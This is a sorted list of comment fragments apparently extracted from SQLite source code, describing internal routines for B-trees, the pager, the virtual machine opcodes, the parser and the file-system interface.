 The translation is done in-place (since it is impossible for the
 The tree being checked out 
 The trigger containing the target token 
 The trigger currently being coded 
 The trigger step be fixed to one database 
 The trigger that this step is a part of 
 The triggered program 
 The trunk has no leaves and the list is not being searched.
 The trunk page is required by the caller but it contains
 The two journal files 
 The two new terms are added onto the end of the WhereClause object.
 The type for a callback function.
 The type of type is determined by the flags parameter.  Only the
 The type used to represent a page number.  The first page in a file
 The typedef is necessary to work around problems in certain
 The unlock-notify callback is not reentrant. If an application invokes
 The unpacked record is always constructed by the
 The unpacked record that we will return 
 The unqualified db name 
 The update hook implementation must not do anything that will modify
 The update hook is not invoked when internal system tables are
 The user-supplied minor token value.  This
 The user-version is not used internally by SQLite. It may be used by
 The usual case: There is a WHERE clause so we have to scan through
 The value extracted is stored in register P3.
 The value for the token 
 The value is one of:  0 NONE 1 FULL 2 INCREMENTAL
 The value of N can be inferred from the cursor. N includes the rowid
 The value of NN appears to give the best results overall.
 The value of TK_ and OP_ constants are arranged such that we
 The value of j 
 The value of pExpr.op and op are related as follows:
 The value of the INTEGER PRIMARY KEY column is always a NULL.
 The value of the iVersion field is initially 1 but may be larger in
 The value passed as the second argument to this function is optional.
 The value return 
 The value returned by sqlite3OsSectorSize()
 The value returned by sqlite3_backup_finish is [SQLITE_OK] if no error
 The value returned by this function should always be the same as
 The value returned depends on the value of db->temp_store (runtime
 The value returned does not include the zero terminator at the end
 The value returned includes space to create a copy of the Expr struct
 The value returned will never be negative.  Nor will it ever be greater
 The value to apply affinity to 
 The value written into the 
 The values returned by these functions are only updated by
 The variable-length integer encoding is as follows:
 The vdbe must make its own copy of the column-type and other
 The version of the library
 The very beginning of the WHERE loop 
 The vfsFlags parameter is a bitmask to pass to the flags parameter
 The virtual data_base engine 
 The virtual database engine 
 The virtual file system to use 
 The virtual machine 
 The virtual machine being built up 
 The virtual machine under construction 
 The virtual table 
 The virtual table to be modified 
 The vm under construction 
 The where clause needs to defer the handling of the t1.x=5
 The where level to be coded 
 The whole SELECT statement 
 The whole database 
 The winFile structure is a subclass of sqlite3_file
 The world
 The xCachesize() method may be called at any time by SQLite to set the
 The xCreate() method is used to construct a new cache instance. The
 The xDestroy() method is used to delete a cache allocated by xCreate().
 The xDeviceCapabilities method of the [sqlite3_io_methods]
 The xFetch() method is used to fetch a page and return a pointer to it. 
 The xFileControl() method is a generic interface that allows custom
 The xFunc (for scalar functions) or xStep (for aggregates) parameters
 The xInit() method is called once for each call to [sqlite3_initialize()]
 The xMutexEnd method defined by this structure is invoked as
 The xMutexInit method defined by this structure is invoked as
 The xPagecount() method should return the number of pages currently
 The xRandomness() function attempts to return nBytes bytes
 The xRekey() interface is only used to move pages earlier in the
 The xRekey() method is used to change the key value associated with the
 The xRoundup method returns what would be the allocated size of
 The xSectorSize() method returns the sector size of the
 The xSleep() method causes the calling thread to sleep for at
 The xUpdate method will do a DELETE or an INSERT or both.
 The yyzerominor constant is used to initialize instances of
 The zFilename argument is the path to the database file to open.
 The zName field holds the name of the VFS module.  The name must
 The z[] string will probably not be zero-terminated.  But the
 The zero initialization above is all that is needed 
 The zero terminator is not included in this count.
 The zeroblob(N) function returns a zero-filled blob of size N bytes.
 Then B is a table name and the database name is unspecified.  If called
 Then C is the table name and B is the database name.  If C is defined
 Then clear the Btree layer MemPage.isInit flag. Both this module
 Then compare the current GROUP BY terms against the GROUP BY terms
 Then modify the schema cookie (since the ALTER TABLE modifies the
 Then special optimizations can be applied that make the transfer
 Then the OP_ResultRow opcode is used to cause sqlite3_step() to
 Then the code generated is conceptually like the following:
 Then the internal cache might have been left in an inconsistent
 Then we loop over this ephemeral table and for each row in
 There are (N
 There are 6 opcodes numbered from 0 through 5.  0 is the
 There are Btree cursors Debug.Associated with each table.  t1 uses cursor
 There are Hash.htsize buckets.  Each bucket points to a spot in
 There are a couple of different ways this can happen. All are quite
 There are pages on the freelist.  Reuse one of those pages. 
 There are several different types of pointer-map entries that need to
 There are three arguments to this option: A pointer to 8-byte aligned
 There are three possible representations of the bitmap.
 There are two column (M==2) and three rows (N==3).  Thus the
 There are up to 5 names for each column.  useType determines which
 There can only be a single busy handler defined for each
 There can only be a single busy handler for a particular
 There can only be one writer.  A RESERVED_LOCK is obtained by locking
 There is a call to sqlite3Malloc() inside rehash(). If there is
 There is a corresponding leave-all procedures.
 There is a subtle but important optimization here too. When inserting
 There is a vanishingly small chance that a change will not be
 There is an added cost of O(N) when switching between TEST and
 There is at most one AutoincInfo structure per table even if the
 There is little hope of getting SQLite to run if the malloc
 There is no constraint to check 
 There is no interpretation of the data.
 There is no mechanism by which the parser stack can be popped below
 There is no point in factoring out single-instruction constant
 There is now an entry for pExpr in pAggInfo.aCol[] (either
 There is one cursor per table in the FROM clause.  The number of
 There is one exception to this rule. If the page is being rolled
 There is only one exported symbol in this file - the function
 There may be at most one unlock-notify callback registered by a 
 There might be records in the main journal that have a page number
 There must already be a RESERVED or EXCLUSIVE lock on the database
 There must be a read-lock on the database (either a transaction
 There must be an open cursor to pTab in iTable when this routine
 There must be no references to the page previously located at
 There should be at least one opcode.
 There should be exactly one call to sqlite3_backup_finish() for each
 There will be a read lock on the database whenever there is an
 Therefore the next statement sets variable 'max' to 1 for the max()
 These 
 These APIs are only available if the library was compiled with the
 These action code values signify what kind of operation is to be
 These addresses must be stored so that we can go back and fill in
 These are special values for the destructor that is passed in as the
 These are the plaintext passwords!
 These are the requirements:
 These bit values are intended for use in the
 These callback routines are used to implement the following:
 These checks are done:
 These conditions have already been verified in btreeInitPage()
 These constant define integer codes that represent the various
 These constants (all generated automatically by the parser generator)
 These constants are codes for each of those types.
 These constants are the available integer configuration options that
 These constants are the valid operation code parameters used
 These constants define various performance limits
 These features provide the same information as the [SQLITE_VERSION]
 These functions are [deprecated].  In order to maintain
 These functions are used to add new collation sequences to the
 These functions return information about the Nth column returned by
 These functions work very much like the [parameter binding] family of
 These integer constants are opcodes for the xFileControl method
 These integer constants can be used as the third parameter to
 These integer constants designate various run-time status parameters
 These integers are almost always small and are encoded as a single byte.
 These macros are designed to work correctly on both 32-bit and 64-bit
 These macros define the location of the pointer-map entry for a
 These macros used to resolve to various kinds of compiler magic that
 These no-op macros are used in front of interfaces to mark those
 These parameters and their meanings are subject to change
 These preprocessor macros define integer codes that name counter
 These routine are not called anywhere from within the normal
 These routines all implement some additional formatting
 These routines are Walker callbacks.  Walker.u.pi is a pointer
 These routines are in a separate files so that they will not be linked
 These routines are used by the xFunc or xFinal callbacks that
 These routines are used inside assert() statements only. 
 These routines are used to print out the content of all or part of a
 These routines are useful during command-line input to determine if the
 These routines attempt to convert the value where appropriate.  For
 These routines do not parse the SQL statements thus
 These routines implement SQLITE_CONFIG_PAGECACHE.
 These routines is used to get quick access to key and data
 These routines may only be called when the most recent call to
 These routines must be called from the same thread as
 These routines must be called from the same thread in which
 These routines open an SQLite database file whose name is given by the
 These routines provide a means to determine what column of what
 These routines register callback functions that can be used for
 These routines return 0 if the statement is incomplete.  If a
 These routines return [SQLITE_OK] on success or an error code if
 These routines return information about a single column of the current
 These routines return the name assigned to a particular column
 These routines work just like the corresponding [column access functions]
 These routines work only with [protected sqlite3_value] objects.
 These two variables are set by every call to backup_step(). They are
 These used to have mnemonic name like 'i' for SQLITE_AFF_INTEGER and
 Things to be changed 
 Third parameter 
 This (sqlite3EndBenignMalloc()) is called by SQLite code to indicate that
 This API allows applications to modify the global configuration of
 This API can be invoked at program startup in order to register
 This API is only available if the library was compiled with the
 This API is used to overwrite the contents of one database with that
 This API makes sure a global version of a function with a particular
 This API may be used to register a callback that SQLite will invoke 
 This API will need to change to return an error code
 This NaN test sometimes fails if compiled on GCC with -ffast-math.
 This OP_Insert is an sql UPDATE 
 This VDBE program seeks a btree cursor to the identified
 This a more complex version of findCell() that works for
 This action provides a run-time test to see how the ALWAYS and
 This action provides a run-time test to see whether or not
 This adjustment is more than an optimization.  The packing above might
 This allows optimizations: (a) when P4==0 there is no need to test
 This analysis does not consider whether or not the index exists
 This annoyed many windows users.  Those users would then do a
 This array defines hard upper bounds on limit values.  The
 This array determines which meta meta values are preserved in the
 This bitmap records the existence of zero or more bits
 This block codes the top of loop only.  The complete loop is the
 This block deals with an obscure problem. If the last connection
 This block is really an inlined version of sqlite3VdbeMemRelease()
 This block populates the rNotFound register with either NULL
 This block serves to Debug.Assert() that the cursor really does point
 This block sets the variable payloadSize to be the total number of
 This branch is also run for an in-memory database. An in-memory
 This branch is taken when the journal path required by
 This branch may be executed with Pager.journalMode==MEMORY if
 This branch runs if it is known at compile time (now) that
 This branch runs if the record-size field of the cell is a
 This call is a no-op if no write-transaction is currently active on pBt.
 This call is a no-op if table pTab is not a virtual table.
 This call is a no-op if zTab is not a virtual table.
 This call makes sure that the pager has the correct number of
 This call must be made after a call to sqlite3VdbeSetNumCols().
 This callback is invoked once for each index when reading the
 This can be used to implement an in-memory database.
 This can occur if there exists an index on a TEMP table which
 This case is for non-aggregate queries
 This case occurs after failing to recompile an sql statement.
 This case runs if the aggregate has no GROUP BY clause.  The
 This cksum is initialized to a 32-bit random value that appears in the
 This code depends on the fact that certain token values (ex: TK_EQ)
 This code does not produce the correct answer - it just prevents
 This code must be run in its entirety every time it is encountered
 This code really belongs in btree.c.  But btree.c is getting too
 This code runs once to initialize everything.
 This code used to be part of the tokenizer.c source file.  But by
 This configuration should not be used if an application-define page
 This constraint creates the same index as a previous
 This could conceivably cause corruption following a power failure on
 This counter allows other processes to know when the file has changed
 This driver uses malloc()/free() directly rather than going through
 This error is caught long before control reaches this point.
 This error no longer exists 
 This facility is used for testing purposes only.  It does not function
 This file contains C code routines that are called by the SQLite parser
 This file contains C code routines that are called by the parser
 This file contains C code routines that used to generate VDBE code
 This file contains C code that implements the sqlite3_complete() API.
 This file contains C code that splits an SQL input string up into
 This file contains OS interface code that is common to all
 This file contains a no-op memory allocation drivers for use when
 This file contains automatically generated code 
 This file contains code associated with the ANALYZE command.
 This file contains code that is common across all mutex implementations.
 This file contains code that is specific to windows.
 This file contains code to implement a pseudo-random number
 This file contains code use to implement APIs that are part of the
 This file contains code use to implement an in-memory rollback journal.
 This file contains code used to dynamically load extensions into
 This file contains code used to help implement virtual tables.
 This file contains code used to implement incremental BLOB I/O.
 This file contains code used to implement mutexes on Btree objects.
 This file contains code used to implement the ATTACH and DETACH commands.
 This file contains code used to implement the PRAGMA command.
 This file contains code used to implement the VACUUM command.
 This file contains code used to implement the sqlite3_set_authorizer()
 This file contains definitions of global variables and contants.
 This file contains functions used to access the internal hash tables
 This file contains implementations of the low-level memory allocation
 This file contains low-level memory allocation drivers for when
 This file contains macros and a little bit of code that is common to
 This file contains routines used for analyzing expressions and
 This file contains routines used for walking the parser tree and
 This file contains routines used for walking the parser tree for
 This file contains the C functions that implement date and time
 This file contains the C functions that implement mutexes for win32
 This file contains the C functions that implement mutexes.
 This file contains the C functions that implement various SQL
 This file contains the common header for all mutex implementations.
 This file contains the implementation of the sqlite3_backup_XXX()
 This file contains the implementation of the sqlite3_prepare()
 This file contains the implementation of the sqlite3_unlock_notify()
 This file contains the sqlite3_get_table() and //sqlite3_free_table()
 This file defines various limits of what SQLite can process.
 This file implements a external (disk-based) database using BTrees.
 This file implements a special kind of sqlite3_file object used
 This file implements an object that represents a fixed-length
 This file implements that page cache.
 This file implements the default page cache implementation (the
 This file is used for windows only 
 This file should be 
 This function (for internal use only) locates an element in an
 This function allocates a new parser.
 This function always succeeds. If a transaction is active an attempt
 This function assumes that handle p has an open read or write
 This function assumes the following:
 This function attempts to read a master journal file name from the
 This function causes any pending database operation to abort and
 This function changes all write-locks held by connection p to read-locks.
 This function compares the two table rows or index records
 This function contains the logic that determines if a statement or
 This function currently works by first transforming the UTF-16
 This function determines whether or not the atomic-write optimization
 This function disables all previously registered automatic
 This function does not contribute anything to the operation of SQLite.
 This function implements the sqlite3_create_module() and
 This function invokes either the xRollback or xCommit method
 This function is a complex assert() that verifies the following
 This function is a no-op if the journal file has not been written to
 This function is also used as part of Debug.Assert() statements only. It
 This function is called after invoking an sqlite3_value_XXX function on a
 This function is called after the contents of page iPage of the
 This function is called after transitioning from PAGER_UNLOCK to
 This function is called at the start of every write transaction.
 This function is called before modifying the contents of a table
 This function is called by the VDBE to adjust the internal schema
 This function is called by the parser after the table-name in
 This function is called by the pcache layer when it has reached some
 This function is called during initialization (sqlite3_initialize()) to
 This function is called during initialization if a static buffer is
 This function is called from both BtreeCommitPhaseTwo() and BtreeRollback()
 This function is called to drop a trigger from the database schema.
 This function is called to free superfluous dynamically allocated memory
 This function is called to obtain a shared lock on the database file.
 This function is called to rollback or release (commit) a savepoint.
 This function is called when
 This function is called when a free-list leaf page is removed from the
 This function is called when connection p is concluding its
 This function is called when the root page of a b-tree structure is
 This function is called while stepping or preparing a statement
 This function is deprecated.  Do not use it for new code.  It is
 This function is invoked by the parser to call the xConnect() method
 This function is invoked by the vdbe to call the xCreate method
 This function is invoked by the vdbe to call the xDestroy method
 This function is now an anachronism. It used to be used to recover from a
 This function is only called from two places. In both cases the vdbe
 This function is only called from within an assert() expression. It
 This function is only used as part of an Debug.Assert() statement. It checks
 This function is responsible for invoking the collation factory callback
 This function is used by SQL generated to implement the
 This function is used by test procedures to inspect the internal state
 This function is used by the implementation of the IN (...) operator.
 This function is used internally to remove the page pPage from the
 This function is used to add page iPage to the database file free-list.
 This function is used to change the actual size of the database
 This function is used to copy the contents of the b-tree node stored
 This function is used to read data from an open [BLOB handle] into a
 This function is used to read or overwrite payload information
 This function is used to resize the hash table used by the cache passed
 This function is used to set the schema of a virtual table.  It is only
 This function is used to write data into an open [BLOB handle] from a
 This function loops through each entry in the blocked connections
 This function may be called more than once on a single virtual machine.
 This function may load one or more schemas from database files. If an
 This function may only be called if the b-tree connection already
 This function may only be called when the mutexes associated with all
 This function may only modify the contents of the BLOB
 This function may return SQLITE_NOMEM or an IO error code if an error
 This function modifies the data stored as part of that entry.
 This function must be called before exiting any API function (i.e.
 This function performs two tasks:
 This function reads the contents of the master-journal file into
 This function registered all of the above C functions as SQL
 This function returns SQLITE_CORRUPT if the page-header flags field of
 This function returns a pointer to a blob of memory associated with
 This function returns the collation sequence for database native text
 This function returns the number of database rows that were changed
 This function returns the number of direct row changes in the
 This function returns the same value as date('now').
 This function returns the same value as datetime('now').
 This function returns the same value as time('now').
 This function returns the space in bytes required to store the copy
 This function returns true if main-memory should be used instead of
 This function sets a flag only. The actual page location cache
 This function sets the MEM_Dyn flag and clears any xDel callback.
 This function sets the [database connection] error code and message
 This function should be used to report any error that occurs whilst
 This function should not be called if the pager is not in at least
 This function should only be called on a sharable b-tree after it
 This gives the application an opportunity to prioritize any actions 
 This happens if a malloc() inside a call to sqlite3_column_text() or
 This happens when an attempt to open a read cursor on the
 This happens when attempting to open the sqlite3_master table
 This happens when the pager was in exclusive-access mode the last
 This has the effect of making sure that the string is well-formed
 This header defines the interface to the virtual database engine
 This header file (together with is companion C source-code file
 This header file defines the SQLite interface for use by
 This header file defines the interface that the SQLite library
 This header file defines the interface that the sqlite B-Tree file
 This header file defines the interface that the sqlite page cache
 This header file is 
 This header file is also used by the loadext.c source file
 This header file is used by programs that want to link against the
 This implementation assumes that reading or writing an aligned
 This implementation in this file does not provide any mutual
 This implementation uses a state machine with 7 states:
 This implemention requires years to be expressed as a 4-digit number
 This indicates nothing more needs to be rolled back.
 This indicates that no database name was specified as part
 This information is used by the xBestIndex methods of
 This instruction causes the VM to halt.
 This instruction checks if index P1 contains a record for which
 This instruction is used to implement the IN operator where the
 This instruction makes a deep copy of the value.  A duplicate
 This instruction makes a shallow copy of the value.  If the value
 This instruction only works for indices.  The equivalent instruction
 This instruction only works on tables.  The equivalent instruction
 This instruction throws an error if the memory cell is not initially
 This instruction works just like OpenRead except that it opens the cursor
 This interface allows the size of various constructs to be limited
 This interface can be used by a program to make sure that the
 This interface can be used to retrieve a saved copy of the original
 This interface has exactly the same effect as calling
 This interface is not for use by applications.  It exists solely
 This interface is used to retrieve and reset counter values from
 This interface is used to retrieve runtime status information
 This interface is used to retrieve runtime status information 
 This interface loads an SQLite extension library from the named file.
 This interface only reports on the compile-time mutex setting
 This interface returns a pointer the [sqlite3_mutex] object that 
 This interface returns a pointer to the next [prepared statement] after
 This interfaces is needed so that users of cursors can preallocate
 This interfaces opens a [BLOB handle 
 This is a C
 This is a NEW or OLD pseudo-tables of a trigger 
 This is a Walker.xSelectCallback callback for the sqlite3SelectTypeInfo()
 This is a convenience routine that makes sure that all thread-specific
 This is a difficult situation to handle. Returning an error
 This is a horrible situation. An IO or malloc() error occurred whilst
 This is a magic string that appears at the beginning of every
 This is a no-op if NDEBUG is defined.
 This is a no-op if the shared-cache is not enabled 
 This is a utility routine used to set the ExprSpan.zStart and
 This is a verification routine is used only within Debug.Assert() statements.
 This is actually a deferred seek.  Nothing actually happens until
 This is an EXPERIMENTAL api and is subject to change or removal.
 This is an important assumption.  There are many places in the
 This is an internal consistency check
 This is an internal extension to SQLITE_STATIC and SQLITE_TRANSIENT.
 This is an internal self-check only - it is not an essential processing
 This is because the call to pager_write_pagelist() below will not
 This is called by the parser when it sees a CREATE TRIGGER statement
 This is called to code FOR EACH ROW triggers.
 This is called when the database connection passed as an argument is
 This is defined in tokenize.c.  We just have to import the definition.
 This is different from sqlite3Atoi64() which requires the
 This is equivalent to
 This is legacy and deprecated.  It is included for historical
 This is likely to be an append 
 This is not a real checksum. It is really just the sum of the
 This is not required if the persistent media supports the
 This is really OP_Noop and OP_Explain 
 This is really just the default value for the max_page_count pragma.
 This is safe because dropping a cell only overwrites the first
 This is so that expressions can be written as:
 This is the (easy) common case where the entire payload fits
 This is the 2-bit case and we are on the second iteration and
 This is the 2nd template.
 This is the beginning of the delete loop. If a trigger encounters
 This is the callback routine for the code that initializes the
 This is the case if the data for the INSERT is coming from a VALUES
 This is the database that must be used 
 This is the header file for information that is private to the
 This is the header file for the generic hash-table implemenation
 This is the implementation of generic hash-tables
 This is the maximum number of
 This is the only way out of this procedure.  We have to
 This is the only way to move a VDBE from VDBE_MAGIC_INIT to
 This is the processing for aggregate queries 
 This is the top of the main insertion loop 
 This is the top-level implementation of sqlite3_step().  Call
 This is the xExprCallback for a tree walker.  It is used to
 This is true even if this routine fails to allocate a new WhereTerm.
 This is used by the OP_IsUnique opcode.
 This is what we do if the grammar does define ERROR:
 This is what we do if the grammar does not define ERROR:
 This just creates a place-holder record in the sqlite_master table.
 This list is shared across threads.  The SQLITE_MUTEX_STATIC_MASTER
 This lookup table is used to help decode the first byte of
 This loop also drops the divider cells from the parent page. This
 This loop also figures out the nesting order of tables in the FROM
 This loop determines (a) if the commit hook should be invoked and
 This loop fills in the following fields:
 This loop moves all of the FROM elements of the subquery into the
 This loop runs once for each destination page spanned by the source
 This loop runs once for each entry in the blocked-connections list. 
 This loop terminates either when a readJournalHdr() or
 This macro added to every instruction that does a jump in order to
 This macro is used to compare two strings in a case-insensitive manner.
 This may be called directly from the parser and therefore identifies
 This method for implementing the INSERT transfers raw records from
 This module contains C code that generates VDBE code used to process
 This module implements the sqlite3_status() interface and related
 This module is only called on query plans that use an index. 
 This must be an attempt to read the NEW or OLD pseudo-tables
 This object defines the methods used to perform various operations
 This object is intended to be opaque outside of the where.c module.
 This object is used in only one place in the SQLite interface.
 This occurs when a page is changed prior to the start of a statement
 This occurs when the array of context pointers that need to
 This only happens if there was a prior error 
 This only happens when coding check constraints 
 This only works for very simple expressions that consist of one constant
 This opcode does exactly the same thing as OP_Rewind except that
 This opcode invokes the corresponding xRename method. The value
 This opcode invokes the corresponding xUpdate method. P2 values
 This opcode invokes the xFilter method on the virtual table specified
 This opcode is used to implement the integrity_check pragma.
 This opcode is used when extracting information from a column that
 This opcode records information from the optimizer.  It is the
 This opcode sets the number of columns for the cursor opened by the
 This opcode was once called OpenTemp.  But that created
 This operation is protected by the STATIC_MASTER mutex.  Note that
 This operation is used to detect when that the cookie has changed
 This optimization is only attempted if
 This option can be used to overload the default memory allocation
 This option can be used to overload the default mutex allocation
 This particular expression does not need to be expanded.
 This plan is not completely bullet-proof.  It is possible for
 This prevents a memory copy.
 This procedure generates VDBE code for a single invocation of either the
 This really never should happen except in a corrupt
 This requires a master journal file to ensure the transaction is
 This routine acts recursively on all subqueries within the SELECT.
 This routine actually returns the index of the largest (rightmost)
 This routine adds datatype and collating sequence information to
 This routine also does error checking and name resolution for
 This routine also does the following optimization:  It scans for
 This routine always allocates at least one memory cell and returns
 This routine analyzes terms such as the middle term in the above example.
 This routine assumes that z[] really is a valid number.  If it
 This routine attempts to find an scanning strategy that can be used
 This routine attempts to flatten subqueries in order to speed
 This routine attempts to rewrite queries such as the above into
 This routine calls the finalize method for that function.  The
 This routine can be called at any point during the execution of the
 This routine can be used to find the number of [SQL parameters]
 This routine cannot fail.  It always returns SQLITE_OK.
 This routine changes the values of iLimit and iOffset only if
 This routine checks for a byte-order mark at the beginning of the
 This routine checks if there is a RESERVED lock held on the specified
 This routine checks that the sqlite3.activeVdbeCnt count variable
 This routine checks to see if pE is a simple identifier which corresponds
 This routine configures a callback function - the
 This routine constructs a binary expression node out of two ExprSpan
 This routine converts an ephemeral string into a dynamically allocated
 This routine deallocates a previously
 This routine deallocates a previously allocated mutex.
 This routine decides if pIdx can be used to satisfy the ORDER BY
 This routine destroys a UnpackedRecord object.
 This routine does NOT free the Select structure passed in.  The
 This routine does a case-independent search of zType for the
 This routine does a complete check of the given BTree file.  aRoot[] is
 This routine does not check if there is a master journal filename
 This routine does the first phase of a two-phase commit.  This routine
 This routine does the work of opening a database on behalf of
 This routine enables or disables the sharing of the database cache
 This routine ends a transaction. A transaction is usually ended by
 This routine ensures that:
 This routine frees the space the sqlite3_get_table() malloced.
 This routine generates VDBE code that causes a single row of a
 This routine generates VDBE code that causes the deletion of all
 This routine generates code that opens the sqlite_stat1 table on cursor
 This routine generates code that will initialize all of the
 This routine generates code to finish the INSERT or UPDATE operation
 This routine generates the code for the inside of the inner loop
 This routine generates the code needed to write autoincrement
 This routine gets called when a rollback occurs.
 This routine has been called to create an automatic index as a
 This routine has no effect on existing database connections.
 This routine identifies subexpressions in the WHERE clause where
 This routine implements a busy callback that sleeps and tries
 This routine implements the OP_Vacuum opcode of the VDBE.
 This routine implements the bulk of the logic behind the sqlite_step()
 This routine implements the second phase of a 2-phase commit.  The
 This routine installs a default busy handler that waits for the
 This routine is a attempt to detect if two threads use the
 This routine is a faster version of sqlite3PutVarint() that only
 This routine is a no-op if the database schema is already initialised.
 This routine is a wrapper around sqlite3FindCollSeq().  This routine
 This routine is added to support DBD::SQLite.
 This routine is also called from the OP_ParseSchema opcode of the VDBE.
 This routine is an optimization.  It is common for the entire key
 This routine is call to handle SQL of the following forms:
 This routine is callback for sqlite3WalkExpr().
 This routine is called after a single SQL statement has been
 This routine is called after all of the trigger actions have been parsed
 This routine is called by the parser to add a new term to the
 This routine is called by the parser to deal with on of those terms.
 This routine is called by the parser while in the middle of
 This routine is called for terms to INSERT or UPDATE.  And the only
 This routine is called if the collation factory fails to deliver a
 This routine is called on a collation sequence before it is used to
 This routine is called once after all opcodes have been inserted.
 This routine is called once for each row in the result table.  Its job
 This routine is called prior to sqlite3PagerCommit when a transaction
 This routine is called the when a VDBE tries to halt.  If the VDBE
 This routine is called to create a connection to a database BTree
 This routine is called to create a new foreign key on the table
 This routine is called to do the work of a DROP TABLE statement.
 This routine is called to increment the value of the database file
 This routine is called to process a compound query form from
 This routine is called when a commit occurs.
 This routine is called when a new SQL statement is beginning to
 This routine is called when an INITIALLY IMMEDIATE or INITIALLY DEFERRED
 This routine is called when an operation failed with a lock.
 This routine is called when entering an SQLite API.  The SQLITE_MAGIC_OPEN
 This routine is not called unless a transaction has already been
 This routine is part of the flattening procedure.  A subquery
 This routine is similar to alloca() in that it is not intended
 This routine is the core allocator for Expr nodes.
 This routine is the destructor for the [sqlite3] object.
 This routine is the only routine in this file with external linkage.
 This routine is the only way to move the state of a VM from
 This routine is the same as the sqlite3_complete() routine described
 This routine is threadsafe but is not atomic.  This routine can
 This routine is used for expressions that are used multiple
 This routine is used for testing and analysis only.
 This routine is used inside assert() statements only.
 This routine is used instead of the library atof() function because
 This routine is used only from within assert() statements.
 This routine is used to allow virtual table implementations to
 This routine is used to check if the UTF-8 string zName is a legal
 This routine is used to register a new [virtual table module] name.
 This routine is useful for setting a jump destination.
 This routine is useful when a large program is loaded from a
 This routine just deletes the data structure.  It does not unlink
 This routine just records the fact that the lock is desired.  The
 This routine makes a (partial) copy of the Table structure
 This routine might attempt to reuse the value of the column that
 This routine might cause sub-bitmaps to be allocated.  Failing
 This routine must be called from the same thread in which
 This routine needs to reset the extra data section at the end of the
 This routine only works on a [BLOB handle] which has been created
 This routine pops the top of the stack to remove the record number
 This routine processes the join information for a SELECT statement.
 This routine redistributes cells on the iParentIdx'th child of pParent
 This routine registers a authorizer callback with a particular
 This routine requires that all identifiers in the SELECT
 This routine resolves each term of the clause into an expression.
 This routine returns SQLITE_OK on success and a non-zero
 This routine returns TRUE if the optimization is attempted.  If any
 This routine returns [SQLITE_OK] if shared cache was enabled or disabled
 This routine returns a pointer to the array of objects.  This
 This routine returns a pointer to the name of the n-th
 This routine returns an error code if something goes wrong.  The
 This routine returns metadata about a specific column of a specific
 This routine returns the [rowid] of the most recent
 This routine returns the number of errors encountered.
 This routine returns the number of errors.  If any errors are
 This routine runs an extensive test of the Bitvec code.
 This routine runs when the memory allocator sees that the
 This routine sets a [sqlite3_busy_handler 
 This routine sets a callback function that might be invoked whenever
 This routine sets of a SELECT statement for processing.  The
 This routine sets the busy callback for an Sqlite database to the
 This routine sets the error code and string returned by
 This routine sets the ppUnqual pointer to point at the token (pName1 or
 This routine sets the progress callback for an Sqlite database to the
 This routine sets the state to CURSOR_FAULT and the error
 This routine sets the value to be returned by subsequent calls to
 This routine should be called when the top of the stack holds a
 This routine should not be called if a prior error has occurred.
 This routine should only be called after the expression has been
 This routine should only be called when there are no outstanding
 This routine starts a new transaction if we are not already within
 This routine stores a pointer to the extension in an array that is
 This routine takes the module argument that has been accumulating
 This routine transforms the internal text encoding used by pMem to
 This routine updates the pointer map entry for page number 'key'
 This routine walks (recursively) an expression tree and generates
 This routine walks an expression tree and resolves references to
 This routine will drop an existing named index.  This routine
 This routine will fail with SQLITE_LOCKED if there are any open
 This routine will increase the size of the pWC.a[] array as necessary.
 This routine will only increase a lock.  The winUnlock() routine
 This routine works only for pages that do not contain overflow cells.
 This routinen only works if h really is a valid hexadecimal
 This routines provide no mutual exclusion or error checking.
 This same function (with a different compareInfo structure) computes
 This second example is an SQL syntax error.  As a general rule you should
 This section contains code for WinCE only.
 This section is run by the right-most SELECT statement only.
 This section will be null unless lemon is run with the -m switch.
 This should never happen.  We should always be able to
 This statement has already been prepared.  There is no need
 This statement is parsed up as follows:
 This statement is so common that it is optimized specially. The
 This structure also contains some state information.
 This structure consists mostly of methods for the module.
 This structure holds a record that has already been disassembled
 This structure is defined inside of vdbeInt.h because it uses substructures
 This structure is passed around through all the sanity checking routines
 This structure is the current state of the generator.
 This structure is used to pass data from sqlite3_get_table() through
 This structure records all of the Btrees that need to hold
 This subclass is a subclass of sqlite3_file.  Each open memory-journal
 This superclass exists in order to define fields of the cursor that
 This table is not a VIEW 
 This term is already coded 
 This term must be of the form t1.a==t2.b where t2 is in the
 This test function is not currently used by the automated test-suite.
 This thread is currently holding mutexes on all Btrees (because
 This trick assumes that both the page-size and sector-size are
 This value can be lowered (or raised) at run-time using that the
 This vector defines all the methods that can operate on an
 This version of balance() handles the common special case where
 This version of the memory allocation is for use by the application.
 This version of the memory allocator is the default.  It is
 This will force all the Expr.token.z values to be dynamically
 This will release the write lock on the database file.  If there
 This works just like the Lt opcode except that the jump is taken if
 Thread holding this mutex 
 ThreadData structure.
 Three memory locations are allocated:
 Thus the program must guarantee that the original will not change
 Ticket 
 Time when query started - used for profiling 
 Timezone offset in minutes 
 To avoid having to register all collation sequences before a database
 To many cells for a single page.  The page must be corrupt 
 To perform a backup operation: 
 To resolve table columns references we look for nodes (or subtrees) of the
 To state it another way:  This routine returns a list of all triggers
 Token argument.  Might be NULL 
 Token associated with this expression 
 Token for literal value 1 
 Token that describes the complete CREATE TRIGGER 
 Token types used by the sqlite3_complete() routine.  See the header
 Token value. Zero terminated and dequoted 
 Token with unqualified schema object name 
 Token:           
 Token:                                                
 Tokens are often just pointers into the original SQL text and so
 Top of the IN loop 
 Top of the input loop 
 Top of the loop body 
 Top of the update loop 
 Top-level operator.  pExpr.op 
 Total amount of payload 
 Total number of I/O Errors 
 Total number of bytes in the record 
 Total number of bytes on a page 
 Total number of pages in apHash 
 Total number of pages in database file 
 Total number of pages to copy 
 Total pages involved in the balance 
 Total size in bytes of journal file pJrnl 
 Total size of cell content in bytes 
 Total size of the database file 
 Total time spend executing this instruction 
 Trace function 
 Trace output macros
 Transaction currently open
 Transaction state 
 Transfer all bindings from the first statement over to the second.
 Transfer the FROM clause terms from the subquery into the
 Transfer the contents of pFrom to pTo. Any existing value in pTo is
 Transfer the values of bound parameters P1..P1
 Transform this into an alias to the result set 
 Transformed into:
 Transient list of dirty pages 
 Transitions between states above are determined by tokens extracted
 Translate UTF-8 to UTF-8.
 Translate a single UTF-8 character.  Return the unicode value.
 Translate a single byte of Hex into an integer.
 Translate from TK_xx operator to WO_xx bitmask.
 Treat the current value of p.iJD as the number of
 Trigger Name    Table Name      
 Trigger actions being coded 
 Trigger being finished 
 Trigger name for error reporting 
 Trigger opcode 
 Trigger the alarm
 Trigger under construct by a CREATE TRIGGER 
 True (1) if iJD is valid 
 True (1) if tz is valid 
 True after a parsing error.  Ticket 
 True after initialization has finished 
 True after malloc is initialized 
 True because of CursorMoveto() call above 
